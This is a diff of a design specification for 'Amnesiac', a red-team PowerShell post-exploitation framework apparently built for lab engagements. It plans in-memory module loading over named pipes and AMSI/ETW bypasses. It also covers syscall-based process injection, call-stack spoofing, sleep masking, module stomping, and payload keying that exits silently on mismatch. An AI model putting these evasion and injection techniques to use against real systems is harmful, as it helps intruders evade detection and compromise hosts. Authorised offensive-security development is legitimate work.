+`Send-Module` streams tool source over the named pipe. Framing protocol (sent as regular pipe commands to the target):
 
-# New default — uses $global:IP if set (-IP param), otherwise auto-detects first
-# RFC-1918 address on the operator machine
-$operatorIP = if($global:IP){ $global:IP } else {
-    Get-NetIPAddress -AddressFamily IPv4 |
-        Where-Object { $_.IPAddress -match "^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)" } |
-        Select-Object -First 1 -ExpandProperty IPAddress
-}
-$global:ServerURL = "http://${operatorIP}:8080"
-```
+1. Operator side sends: `__MODULE_BEGIN__:<name>:<total_length>\n`
+2. Followed by chunks: `__MODULE_CHUNK__:<base64_chunk>\n` (4KB each)
+3. End: `__MODULE_END__:<name>\n`
 
-GitHub URL remains accessible via explicit `RepoURL <url>` override but is not the default.
+Target assembles chunks, reconstructs source, executes via `[scriptblock]::Create($source).Invoke()`. For PS script modules: plain text reassembly. For binary (.NET) modules: base64-decode the assembled data → `[Reflection.Assembly]::Load()`.
 
-### 6.6 GitHub call blocking
+AmnesiacLoader's `Bypass.PatchAmsiPageGuard()` is called on the target before loading any binary modules (sent as a preceding command in the pipe session).
 
-When `diskmode` is off, any `iex(new-object net.webclient).downloadstring` call targeting `githubusercontent.com` is intercepted. The framework checks `$global:ToolCache` first and substitutes from cache. If not cached:
+### 8.5 New `modules` Commands
 
 ```
- [-] Module not in local cache. Options:
-     1. Add tool to Tools\ and run: modules reload
-     2. Start operator HTTP server: serve
-     3. Enable diskmode to allow external downloads (not recommended on engagements)
-```
-
-### 6.7 Binary tools
-
-.NET assemblies (Ferrari/Rubeus, etc.) sent as base64 over pipe → loaded via `[Reflection.Assembly]::Load()` on target.
-
-Native EXEs (RDPKeylog.exe) inherently require disk. When invoked with `diskmode off`:
-```
- [!] RDPKeylog.exe requires disk write. Enable diskmode to proceed.
-```
-
-### 6.8 New `modules` commands
-
-```
-modules              — list all tools with cache status
+modules              — list tools with cache status (core/standard/heavy/missing)
 modules reload       — re-scan Tools\ and refresh cache
 modules status       — show embedded / local / remote breakdown
 ```
 
 ---
 
-## 7. Layer 4 — Operational Guardrails
+## 9. Layer 4 — Operational Guardrails
 
-### 7.1 Engagement profiles
+### 9.1 Engagement Profiles
 
 ```
 engagement                  — show current profile
@@ -408,55 +542,61 @@ engagement domained         — Scenario 2: domain-joined assumed breach
 engagement reset            — clear profile
 ```
 
-**Profile-driven defaults:**
-
 | Setting | `nondomained` | `domained` |
 |---------|---------------|------------|
 | Default listener mode | GListener | Listener or GListener |
-| runas /netonly guidance at startup | Yes | No |
+| runas /netonly guidance | Yes | No |
 | PSK default derivation | pipe name + operator IP | pipe name + machine SID |
-| GitHub URL warning | Block (warn) | Block (warn) |
 
-### 7.2 runas /netonly session detection
-
-On startup in `nondomained` mode, Amnesiac checks for a Type-9 (NewCredentials) logon token — produced by `runas /netonly`:
+### 9.2 runas /netonly Token Detection
 
 ```powershell
 function Test-NetworkLogonToken {
-    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    # Enumerate token groups / logon type for NewCredentials (9)
-    # Return: $true if network logon token present, $false otherwise
+    # Check for Type-9 (NewCredentials) logon session
+    # Return $true if network logon token present
 }
 ```
 
-Output:
 - Token detected: `[+] Network logon token detected [DOMAIN\username] — domain resources accessible`
-- Token not detected: `[!] WARNING: No network logon token detected. Launch from: runas /netonly /user:DOMAIN\user powershell.exe`
+- Not detected: `[!] WARNING: No network logon token detected. Launch from: runas /netonly /user:DOMAIN\user powershell.exe`
 
-### 7.3 Payload environment keying
+### 9.3 AES Pipe Channel Encryption
 
-Optional pre-execution checks baked into payloads. Configured before payload generation:
+All pipe I/O encrypted with AES-128 CBC after initial handshake.
+
+Key exchange:
+1. Target generates 16-byte random session key
+2. Target encrypts session key with PSK using AES-128
+3. Target sends encrypted key as first pipe message
+4. Operator decrypts with PSK
+5. All subsequent messages use session key
 
 ```
-key hostname  <name>     — abort if $env:COMPUTERNAME doesn't match
-key domain    <name>     — abort if domain doesn't match
-key user      <name>     — abort if running user doesn't match
-key clear                — remove all keys
-key show                 — display current key configuration
+psk <passphrase>    — set pre-shared key
+psk                 — show PSK status (masked)
+psk reset           — revert to derived default (SHA-256 of pipe name, first 16 bytes)
 ```
 
-Keys are prepended to the payload script before gzip compression. Failed checks produce silent exit — no error output, no pipe creation, no network call:
+### 9.4 Payload Environment Keying
 
+Managed via `payload key` subcommands (absorbed from old `key` command):
+
+```
+payload key hostname  <name>
+payload key domain    <name>
+payload key user      <name>
+payload key clear
+payload key show
+```
+
+Prepended to payload before compression. Failed checks produce silent exit — no output, no network call:
 ```powershell
-# Prepended block (example with all keys set)
 if($env:COMPUTERNAME -ne 'WIN-TARGET01'){ exit }
 if((Get-WmiObject Win32_ComputerSystem).Domain -ne 'GOAD.LOCAL'){ exit }
 if($env:USERNAME -ne 'svc-sql'){ exit }
 ```
 
-### 7.4 Startup OPSEC summary
-
-Amnesiac prints a status banner at startup showing current security posture:
+### 9.5 Startup OPSEC Summary Banner
 
 ```
  [+] Amnesiac vX.X — Red Team Edition
@@ -468,57 +608,60 @@ Amnesiac prints a status banner at startup showing current security posture:
  [+] End marker:       xK9mPqRt  (session-unique)
  [+] Buffer size:      2048 bytes
  [+] Loader:           AmnesiacLoader v1.0 (embedded)
- [+] Default launcher: ps
+ [+] Payload profile:  amsi=pageguard etw=provider launcher=ps encoding=gzip obfuscation=high
  [+] PSK:              configured (derived)
  ─────────────────────────────────────────────
  [!] Heavy modules not cached: Suntour, Ferrari, ppl
      Run 'serve' to enable via local HTTP server
 ```
 
-### 7.5 PSK management
+---
 
-```
-psk <passphrase>    — set pre-shared key for AES pipe channel
-psk                 — show PSK status (masked, not value)
-psk reset           — revert to default (derived from pipe name)
-```
+## 10. Implementation Order
+
+| Phase | Layer | Deliverable |
+|-------|-------|-------------|
+| 1 | Layer 1 | Disk elimination, diskmode, artifact store |
+| 2 | Layer 4 | Engagement profiles, token detection, OPSEC banner, psk command |
+| 3 | Layer 2 (partial) | Session-unique EndMarker/BufferSize, payload builder commands, AMSI bypass catalog (PS fallback), jitter/obfuscation levels |
+| 4 | Layer 3 | ToolCache, Send-Module, modules command, operator HTTP server default |
+| 5 | Layer 2b — Bypass.cs | AmnesiacLoader: Bypass.cs (pageguard + hwbp + EtwEventWrite patch) |
+| 6 | Layer 2b — Loader.cs | AmnesiacLoader: SSN resolution (Hell's Gate + Halo's Gate), Early Bird APC, thread hijacking |
+| 7 | Layer 2b — CallStack.cs | Call stack frame spoofing |
+| 8 | Layer 2b — SleepMask.cs | Sleep masking |
+| 9 | Layer 2b — Stomper.cs | Module stomping |
+| 10 | Layer 2b — UnmanagedPS.cs | CLR hosting, Migrate ps command |
+
+Phases 1–4 are pure PS and can be developed and tested independently.  
+Phases 5–10 are C# and require `.NET SDK 6.0+` build toolchain.
 
 ---
 
-## 8. Implementation Order
-
-The layers are independent. Recommended implementation sequence:
-
-| Phase | Layer | Rationale |
-|-------|-------|-----------|
-| 1 | Layer 1 (disk elimination) | Foundational — everything else assumes this is in place |
-| 2 | Layer 4 (operational guardrails) | Low risk, high value — changes startup UX immediately |
-| 3 | Layer 3 (in-memory tool delivery) | High OPSEC impact — eliminates GitHub IOC |
-| 4 | Layer 2a (payload extensions) | Builds on existing stealth format |
-| 5 | Layer 2b (AmnesiacLoader C# assembly) | Most complex, most impactful against CS |
-
----
-
-## 9. Files Changed / Created
+## 11. Files Changed / Created
 
 | File | Change type | Notes |
 |------|------------|-------|
-| `Amnesiac.ps1` | Modified | All layer changes; add `$AmnesiacLoaderB64` constant |
-| `Amnesiac_ShellReady.ps1` | Modified | Sync all changes from Amnesiac.ps1 |
-| `AmnesiacLoader/Loader.cs` | New | Indirect syscall injection |
+| `Amnesiac.ps1` | Modified | All layer changes; `$AmnesiacLoaderB64` constant |
+| `Amnesiac_ShellReady.ps1` | Modified | Sync all changes (deferred to final phase) |
+| `AmnesiacLoader/Loader.cs` | New | Multi-technique injection engine |
+| `AmnesiacLoader/Bypass.cs` | New | AMSI/ETW bypass methods |
 | `AmnesiacLoader/CallStack.cs` | New | Frame spoofing |
 | `AmnesiacLoader/SleepMask.cs` | New | Memory encryption during sleep |
+| `AmnesiacLoader/UnmanagedPS.cs` | New | CLR hosting for PS migration |
+| `AmnesiacLoader/Stomper.cs` | New | Module stomping |
 | `AmnesiacLoader/AmnesiacLoader.csproj` | New | .NET 4.6.2 project file |
 | `AmnesiacLoader/Build.ps1` | New | Build + embed script |
-| `CLAUDE.md` | New | Project objectives and build guide |
-| `CHANGELOG.md` | New | All changes with context |
+| `CLAUDE.md` | Modified | Updated architecture reference |
+| `CHANGELOG.md` | Modified | All changes with operational context |
 
 ---
 
-## 10. Out of Scope
+## 12. Out of Scope
 
 - Internet-facing C2 (DNS tunnelling, domain fronting, external callbacks)
 - Persistence mechanisms (scheduled tasks, registry run keys, WMI subscriptions)
 - Privilege escalation exploits
-- Full modular rebuild (Approach 3 — deferred)
-- Amnesiac_ShellReady.ps1 sync (deferred to final phase — sync manually)
+- Full modular rebuild
+- Kernel-level ETW bypass (requires driver)
+- CFG bypass (deferred — handle by targeting non-CFG processes initially)
+- Amnesiac_ShellReady.ps1 sync (deferred to final phase)
